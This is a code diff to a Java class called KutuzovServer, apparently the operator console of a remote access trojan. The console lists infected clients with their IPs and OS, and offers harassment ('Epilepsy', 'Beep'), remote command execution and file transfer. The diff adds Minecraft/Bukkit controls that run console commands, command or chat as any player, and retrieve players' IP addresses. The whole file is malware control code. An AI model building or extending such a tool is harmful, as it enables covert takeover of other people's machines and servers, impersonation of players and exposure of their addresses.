@@ -1,6 +1,7 @@
 package me.kutuzov.server;
 
 import me.kutuzov.packet.*;
+import me.kutuzov.packet.bukkit.*;
 import me.kutuzov.server.client.Client;
 import me.kutuzov.server.client.ClientManager;
 import me.kutuzov.server.kftp.KFTPPanel;
@@ -248,13 +249,18 @@ public class KutuzovServer {
         }
     }
 
-    private void user_list_client_windows(Client client) {
-        clearConsole();
+    private void user_list_header(Client client) {
         pnl("CLIENT VERSION: " + client.getVersion());
         pnl("ID: " + client.getIdentifierName());
         pnl("IP: " + client.getIp().substring(0, client.getIp().indexOf(':')));
         pnl("OS: " + client.getOs());
         pnl("LocalIP: " + client.getLocalIp());
+        pnl("IsMC: " + client._isMC());
+    }
+
+    private void user_list_client_windows(Client client) {
+        clearConsole();
+        user_list_header(client);
         pnl("Options: ");
         pnl("  0) Go back");
         pnl("  1) Epilepsy");
@@ -345,11 +351,7 @@ public class KutuzovServer {
 
     private void user_list_client_unix(Client client) {
         clearConsole();
-        pnl("CLIENT VERSION: " + client.getVersion());
-        pnl("ID: " + client.getIdentifierName());
-        pnl("IP: " + client.getIp().substring(0, client.getIp().indexOf(':')));
-        pnl("OS: " + client.getOs());
-        pnl("LocalIP: " + client.getLocalIp());
+        user_list_header(client);
         pnl("Options: ");
         pnl("  0) Go back");
         pnl("  1) Execute command");
@@ -393,13 +395,143 @@ public class KutuzovServer {
         }
     }
 
+    private void user_list_client_bukkit(Client client) {
+        clearConsole();
+
+        CSBukkitInfo info = null;
+        try {
+            client.getOutput().writeObject(new SCBukkitInfo());
+            Packet packet = null;
+            while(!(packet instanceof CSBukkitInfo)) {
+                try {
+                    packet = (Packet) client.getInput().readObject();
+                } catch (OptionalDataException exception) { } catch (IOException exception) {
+                    pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                    readLine();
+                    return;
+                } catch (Exception exception) { }
+            }
+
+            info = (CSBukkitInfo)packet;
+        }catch (IOException exception) {
+            exception.printStackTrace();
+            return;
+        }
+
+        user_list_header(client);
+        pnl("Bukkit Version: " + info.VERSION);
+        pnl("Bukkit Port: " + info.PORT);
+        pnl("Options: ");
+        pnl("  0) Go back");
+        pnl("  1) Send console command");
+        pnl("  2) Send command as player");
+        pnl("  3) Send message as player");
+        pnl("  4) Get player ip");
+        pwl("Option: ");
+        String input = readLine();
+        int option = input.contentEquals("")?-1:Integer.parseInt(input);
+        switch (option) {
+            case 1: {
+                clearConsole();
+                pnl("Please input the desired command: ");
+                pwl("Command: ");
+
+                String command = readLine();
+
+                try {
+                    client.getOutput().writeObject(new SCBukkitCommand(command));
+                    pnl("Command sent!");
+                    break;
+                } catch (IOException exception) {
+                    exception.printStackTrace();
+                }
+            } break;
+
+            case 2: {
+                clearConsole();
+                pnl("Please input the desired player: ");
+                pwl("Player: ");
+
+                String player = readLine();
+
+                pnl("Please input the desired command: ");
+                pwl("Command: ");
+
+                String command = readLine();
+
+                try {
+                    client.getOutput().writeObject(new SCBukkitPlayerCommand(player, command));
+                    pnl("Command sent!");
+                    break;
+                } catch (IOException exception) {
+                    exception.printStackTrace();
+                }
+            } break;
+
+            case 3: {
+                clearConsole();
+                pnl("Please input the desired player: ");
+                pwl("Player: ");
+
+                String player = readLine();
+
+                pnl("Please input the desired message: ");
+                pwl("Message: ");
+
+                String message = readLine();
+
+                try {
+                    client.getOutput().writeObject(new SCBukkitPlayerChat(player, message));
+                    pnl("Message sent!");
+                    break;
+                } catch (IOException exception) {
+                    exception.printStackTrace();
+                }
+            } break;
+
+            case 4: {
+                clearConsole();
+                pnl("Please input the desired player: ");
+                pwl("Player: ");
+
+                String player = readLine();
+
+                try {
+                    client.getOutput().writeObject(new SCBukkitPlayerAddress(player));
+
+                    Packet packet = null;
+                    while(!(packet instanceof CSBukkitPlayerAddress)) {
+                        try {
+                            packet = (Packet) client.getInput().readObject();
+                        } catch (OptionalDataException exception) { } catch (IOException exception) {
+                            pnl("Failed to receive response from [" + client.getFormattedIdentifierName() + "]! (" + exception.getMessage() + ")");
+                            readLine();
+                            return;
+                        } catch (Exception exception) { }
+                    }
+
+                    CSBukkitPlayerAddress bukkitPlayerAddress = (CSBukkitPlayerAddress)packet;
+                    pnl(player + "'s address is: " + bukkitPlayerAddress.address);
+                    readLine();
+                    break;
+                } catch (IOException exception) {
+                    exception.printStackTrace();
+                }
+            }
+
+            case 0:
+                user_list_client(client);
+                break;
+            default:
+                break;
+        }
+
+        user_list_client_bukkit(client);
+    }
+
     private void user_list_client(Client client) {
         clearConsole();
-        pnl("CLIENT VERSION: " + client.getVersion());
-        pnl("ID: " + client.getIdentifierName());
-        pnl("IP: " + client.getIp().substring(0, client.getIp().indexOf(':')));
-        pnl("OS: " + client.getOs());
-        pnl("LocalIP: " + client.getLocalIp());
+        user_list_header(client);
         pnl("Options: ");
         pnl("  0) Go back");
         pnl("  1) Send message");
@@ -409,6 +541,7 @@ public class KutuzovServer {
         pnl("  5) Beep");
         pnl("  6) KFTP(Kutuzov's File Transfer Protocol)");
         pnl("  7) Unix only options");
+        pnl("  8) Bukkit only options");
         pwl("Option: ");
         String input = readLine();
         int option = input.contentEquals("")?-1:Integer.parseInt(input);
@@ -460,6 +593,9 @@ public class KutuzovServer {
                 user_list_client_unix(client);
                 break;
 
+            case 8:
+                break;
+
             case 0:
                 return;
             default: break;
@@ -487,6 +623,8 @@ public class KutuzovServer {
 
         user_list_client(client);
     }
+
+
 
     private void menu() {
         clearConsole();
